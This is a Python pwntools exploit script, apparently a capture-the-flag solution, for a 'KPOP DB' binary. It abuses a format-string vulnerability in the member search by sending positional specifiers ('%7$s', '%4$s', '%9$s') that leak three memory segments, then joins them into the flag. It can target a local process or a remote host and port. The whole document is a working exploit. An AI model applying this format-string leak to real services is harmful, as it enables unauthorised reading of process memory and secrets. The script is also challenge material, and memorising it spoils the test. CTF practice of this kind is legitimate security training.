#!/usr/bin/env python3
from pwn import *
import argparse
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SRC_DIR = os.path.join(BASE_DIR, 'src')
LOCAL_BIN_ABS = os.path.join(SRC_DIR, 'bin', 'kpop')
DEFAULT_LOCAL_HOST = '127.0.0.1'
DEFAULT_LOCAL_PORT = 4010


def get_elf():
	try:
		return ELF(LOCAL_BIN_ABS)
	except Exception as e:
		log.warning(f"Could not load ELF at {LOCAL_BIN_ABS}: {e}")
		return None


def start_process():
	elf = get_elf()
	if elf:
		context.binary = elf
	# Run from src/ so the program can open flag.txt
	return process(['bin/kpop'], cwd=SRC_DIR)


def start_remote(host, port):
	return remote(host, int(port))


def do_search(io, query: bytes):
	io.recvuntil(b'> ')
	io.sendline(b'2')
	io.recvuntil(b'Enter member name: ')
	io.sendline(query)


def leak_segments(io):
	# The program passes varargs as: 1:NOFLAG, 2:KEEP TRYING, 3:NOT HERE, 4:g_seg2, 5:ALMOST, 6:NEARLY, 7:g_seg1, 8:MAYBE, 9:g_seg3
	# We can use positional parameters to pull exactly the ones we want.
	fmt = b'%7$s||%4$s||%9$s'
	do_search(io, fmt)
	io.recvuntil(b'Echo: ')
	line = io.recvline(timeout=2) or b''
	parts = line.strip().split(b'||')
	if len(parts) != 3:
		raise ValueError(f'Unexpected leak line: {line!r}')
	seg1, seg2, seg3 = parts
	return seg1, seg2, seg3


def main():
	parser = argparse.ArgumentParser(description='Exploit for KPOP DB format string.')
	parser.add_argument('mode', choices=['local', 'remote', 'proc'], help='local=connect to 127.0.0.1:9001, remote=connect to host:port, proc=spawn local binary')
	parser.add_argument('--host', default=DEFAULT_LOCAL_HOST)
	parser.add_argument('--port', default=str(DEFAULT_LOCAL_PORT))
	args = parser.parse_args()

	if args.mode == 'proc':
		io = start_process()
	elif args.mode == 'remote':
		io = start_remote(args.host, args.port)
	else:
		io = start_remote(DEFAULT_LOCAL_HOST, DEFAULT_LOCAL_PORT)

	try:
		seg1, seg2, seg3 = leak_segments(io)
		flag = (seg1 + seg2 + seg3).decode(errors='ignore')
		print(flag)
	finally:
		try:
			io.close()
		except Exception:
			pass


if __name__ == '__main__':
	main()
